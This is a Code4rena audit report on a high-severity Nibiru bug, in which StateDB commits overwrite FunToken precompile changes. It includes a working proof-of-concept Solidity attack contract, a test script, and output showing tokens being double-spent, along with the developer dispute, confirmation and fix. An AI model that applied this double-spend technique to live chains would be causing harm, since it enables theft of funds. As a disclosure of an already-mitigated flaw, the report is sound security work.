# Nibiru C4 H-05: Inconsistent state management: ethereumTx StateDB overriding CallContract results

- Source bundle: `report.md`
- Contest: `2024-11-nibiru`
- Contest start: `2024-11-12`
- Contest end: `2024-11-26`
- Original severity: `High`
- Corpus ID: `nibiru-c4-2024-11-h05-precompile-statedb-commit-clobber`

---

## [[H-05] Inconsistent state management: `ethereumTx` `StateDB` overriding `CallContract` results](https://github.com/code-423n4/2024-11-nibiru-findings/issues/24)
*Submitted by [0x007](https://github.com/code-423n4/2024-11-nibiru-findings/issues/24)*

When a precompile is invoked, the context (`ctx`) is cached, and the state database (`statedb`) commits to this cache, ensuring that precompiles operate with the most up-to-date context and data. During the execution of the precompile, the context can be modified, but these changes are not fully reflected in the state database, except for bank-related modifications.

```go
func (s *StateDB) Commit() error {
	if s.writeToCommitCtxFromCacheCtx != nil {
		s.writeToCommitCtxFromCacheCtx()
	}
	return s.commitCtx(s.GetEvmTxContext())
}
```

The snippet above shows that at the end of the transaction, the `evmTxCtx` is updated to the cached context (`cachedCtx`) before the state changes are committed by the `statedb.commitCtx`. However, the issue arises because **`EvmState` and Account modifications made within `cachedCtx` can be overwritten when `statedb.commitCtx` commits the state changes**. This creates a situation where certain state changes, particularly those made by precompiles like `FunToken`, can be lost or corrupted.

For example, the `FunToken` precompile may call `CallContract` and modify `EvmState`'s `AccState` after the account state object has been added to the `statedb` and dirtied.

### Impact

1. **Unlimited token minting**: The state inconsistencies could allow the minting of unlimited `FunToken`'s, as state changes made during precompile execution may be overwritten.
2. **State corruption**: The precompile could corrupt the state of any contract by exploiting the `statedb`'s lack of awareness of the modifications made during precompile execution.
3. **Malicious contract exploits**: An attacker could create a malicious ERC20 token, which, when added to `FunToken`, could leverage the `MaliciousERC20.transfer` method as a callback to perform arbitrary operations on any contract, including state manipulation.
4. **Locking factories**: A lot of factories use create which depends on their nonce being incremented in sequence. If a nonce is reused, the transaction would fail because there's already a contract where they want to deploy.

### Proof of Concept

- **`CreateFunToken`:** Add Nibi, or any valuable coin to `FunToken`.
- **`ConvertCoinToEvm`:** Convert Nibi to ERC20.
- Create eth tx that performs this in the smart contract:
    - Transfer WEI to add object to `statedb`.
    - Convert `X` ERC20 to Nibi through `FunToken.sendToBank`. It would reduce `balanceOf` contract by `X` amount, and mint `X` Nibi coins to the contract.
- At the end of `ethereumTx`, `statedb` would commit the `balanceOf` contract to the initial balance before `FunToken.sendToBank`.

The transfer to add object to statedb can also be done after `precompile` is called because `statedb` would get account and object from `evmTxCtx` which is lagging `cachedCtx`.

### Recommended mitigation steps

Make sure `EthereumTx.statedb` knows what `CallContracts` in `precompile` have done, and it has to work well when reverts occur.

**[k-yang (Nibiru) disputed and commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/24#issuecomment-2550239016):**
 > I don't agree with the statement: 
 >> However, the issue arises because `EvmState` and `Account` modifications made within `cachedCtx` can be overwritten when `statedb.commitCtx` commits the state changes.
> 
> `writeToCommitCtxFromCacheCtx()` writes the changes from `cacheCtx` to `evmTxCtx `, so `cacheCtx` changes are never lost. And furthermore, `s.commitCtx(s.GetEvmTxContext())` writes the `stateObject` changes from `StateDB` to `evmTxCtx`, so `evmTxCtx` accrues all pending changes.
> 
> I firmly believe this is a false positive, but I'm happy to dive deeper into it if the warden can provide a more thorough attack scenario, with actual working code and transactions.

**[0x007 (warden) commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/24#issuecomment-2558467747):**
 > ### POC
> **1. Start localnet:**
>
> ```
> just localnet
> ```
> 
> **2. Create Nibi `Funtoken`:**
>
> ```
> nibid tx evm create-funtoken --bank-denom unibi --from validator --gas auto --gas-adjustment 1.5 --note "" --yes
> ```
> 
> **3. Mint 1 million Nibi to account:**
>
> ```
> nibid tx evm convert-coin-to-evm 0xC0f4b45712670cf7865A14816bE9Af9091EDdA1d 1000000000000unibi --from validator --gas auto --gas-adjustment 1.5 --note "" --yes
> ```
> 
> **4. Create contract:**
>
> Add the following to [contracts](https://github.com/code-423n4/2024-11-nibiru/tree/main/evm-e2e/contracts) in a new file named `POC24.sol`:
>
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.8.24;
> 
> import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
> 
> interface IFunToken {
>     function sendToBank(address erc20, uint256 amount, string calldata to) external returns (uint256 sentAmount);
> }
> 
> contract POC24 {
>     IFunToken public  funToken = IFunToken(0x0000000000000000000000000000000000000800);
>     IERC20 public erc20 = IERC20(0x7D4B7B8CA7E1a24928Bb96D59249c7a5bd1DfBe6);
>     // recipient is validator and it's different from account which would be used to pay evm gas    
>     string public recipient =  "nibi1zaavvzxez0elundtn32qnk9lkm8kmcsz44g7xl";
> 
>     function attack() public {
>         // transfer fun token to any address to dirty the statedb
>         // transferring to self won't work because of this
>         // https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L561
>         // After further test, this part is not necessary
>         // erc20.transfer(0x000000000000000000000000000000000000dEaD, 1);
>         
>         uint balance = erc20.balanceOf(address(this));
>         // sendToBank should reduce balance to zero, but it won't
>         // cacheCtx, yes. But in statedb, No
>         funToken.sendToBank(address(erc20), balance, recipient);
> 
>         // increment journal from 0 because of this
>         // https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L571
>         // Also, did you noticed we transferred the whole balance in sendToBank
>         // But, statedb thinks we have balance
>         erc20.transfer(0x000000000000000000000000000000000000dEaD, 1);
>     }
> }
> ```
> 
> **5. Create Test:**
>
> Add the following to [test](https://github.com/code-423n4/2024-11-nibiru/tree/main/evm-e2e/test) in new file named `poc24.test.ts`
>
> ```ts
> import { describe, it } from '@jest/globals';
> import { parseUnits, formatUnits, Contract } from 'ethers';
> import { account, provider } from './setup';
> import {
>     POC24__factory,
> } from '../types';
> 
> 
> describe('POC24 tests', () => {
>     // Before test, add nibi to funtoken and mint some
>     // nibid tx evm create-funtoken --bank-denom unibi --from validator --gas auto --gas-adjustment 1.5 --note "" --yes
>     // nibid tx evm convert-coin-to-evm 0xC0f4b45712670cf7865A14816bE9Af9091EDdA1d 1000000000000unibi --from validator --gas auto --gas-adjustment 1.5 --note "" --yes
>     it ('it should double spend', async () => {
>         const transferAmount = parseUnits("1000", 6);
>         const erc20Abi = [
>             "function transfer(address recipient, uint256 amount) external returns (bool)",
>             "function balanceOf(address _owner) public view returns (uint256 balance)"
>         ];
>         
>         const nibi_erc20 = new Contract("0x7D4B7B8CA7E1a24928Bb96D59249c7a5bd1DfBe6", erc20Abi, account);
> 
>         // deploy contract
>         const factory = new POC24__factory(account);
>         const contract = await factory.deploy();
>         await contract.waitForDeployment();
> 
>         // transfer the amount to contract
>         let tx = await nibi_erc20.transfer(contract, transferAmount);
>         await tx.wait();
> 
>         // call attack
>         tx = await contract.attack();
>         await tx.wait();
> 
>         // show end balance
>         const balance = await nibi_erc20.balanceOf(contract);
>         console.log(`ERC20 Balance of contract after transaction: ${formatUnits(balance, 6)}`);
>     }, 30000) // test is slow, that's why timeout is set to 30s
> })
> ```
> 
> **6. Check recipient balance before test:**
>
> ```sh
> nibid query bank balances nibi1zaavvzxez0elundtn32qnk9lkm8kmcsz44g7xl --denom unibi
> 
> # Result
> # {"denom":"unibi","amount":"8989100000000"}
> ```
> 
> **7. Run Test:**
>
> ```sh
> cd evm-e2e
> npx hardhat clean && npx hardhat compile && npx jest test/poc24.test.ts --verbose
> 
> # Result
> # ERC20 Balance of contract after transaction: 999.999999
> ```
> 
> **8: Check recipient balance after test:**
>
> It has increased by the same 1,000 Nibi from `sendToBank`.
>
> ```sh
> nibid query bank balances nibi1zaavvzxez0elundtn32qnk9lkm8kmcsz44g7xl --denom unibi
> 
> # Result
> # {"denom":"unibi","amount":"8990100000000"}
> ```
> 
> ### Explanation
> **Before POC `sendToBank`:**
> - `cacheCtx` balance: None
> - `evmTxCtx` balance: 1,000 Nibi
> - `stateObjects` `DirtyStorage`: None
> 
> **In evm `CacheCtxForPrecompile`:**
> - `cacheCtx` balance: 1,000 Nibi
> - `evmTxCtx` balance: 1,000 Nibi
> - `stateObjects` `DirtyStorage`: None
> 
> **After POC `sendToBank`:**
> - `cacheCtx` balance: 0 Nibi
> - `evmTxCtx` balance: 1,000 Nibi
> - `stateObjects` `DirtyStorage`: None
> 
> **After POC `transfer`:**
> - `cacheCtx` balance: 0 Nibi
> - `evmTxCtx` balance: 1,000 Nibi
> - `stateObjects` `DirtyStorage`: 999.999999 Nibi
>
> *Note: Simply using `writeToCommitCtxFromCacheCtx` after `CallContract` won't resolve the issue because we could have dirtied the storage earlier and use the [dirtied storage](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/state_object.go#L271) for subsequent executions instead of reading from `evmTxCtx`.*
> 
> **After `writeToCommitCtxFromCacheCtx`:**
> - `cacheCtx` balance: 0 Nibi
> - `evmTxCtx` balance: 0 Nibi
> - `stateObjects` `DirtyStorage`: 999.999999 Nibi
> 
> **After `s.commitCtx(s.GetEvmTxContext())`:**
> - `evmTxCtx` balance: 999.999999 Nibi

**[berndartmueller (judge) commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/24#issuecomment-2572609931):**
 > @k-yang - please have a look at the PoC provided by the warden and let me know what you think.

**[k-yang (Nibiru) confirmed and commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/24#issuecomment-2578111087):**
 > I did some more digging and I agree it's a valid bug. The bug stems from creating multiple new `StateDBs` in the `ApplyEvmMsg` but resetting the `StateDB` back to the original `StateDB` near the end of the `precompile` call [here](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/funtoken.go#L188); thereby, losing all the storage slot changes in the intermediate `StateDBs`.
> 
> The problem is further compounded by the fact that `StateDB.getStateObject()` always uses the `evmTxCtx` instead of using the `cacheCtx`, which has the latest changes, when it's available.

**Nibiru mitigated:**
> [PR-2165](https://github.com/NibiruChain/nibiru/pull/2165) - Ensure only one copy of `StateDB` when executing Ethereum txs.

**Status:** Mitigation confirmed. 

***
